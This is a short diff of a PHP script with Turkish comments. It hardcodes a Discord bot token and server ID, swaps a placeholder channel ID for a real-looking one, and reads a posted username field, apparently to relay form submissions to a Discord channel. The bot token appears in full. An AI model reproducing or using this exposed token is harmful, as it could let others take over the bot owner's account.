@@ -6,7 +6,7 @@ $bot_token = "MTIwNzc1MDA5MDcxOTEwMDkzOQ.G-861H.A4Lps1Yi-NcYI1JeiEcmWNvhd_D7xacE
 $server_id = "1207747519514415124";
 
 // Göndermek istediğiniz kanalın ID'si
-$channel_id = "YOUR_CHANNEL_ID";
+$channel_id = "1207747519514415127";
 
 // Post edilen verileri al
 $kullaniciAdi = $_POST["kullaniciAdi"];
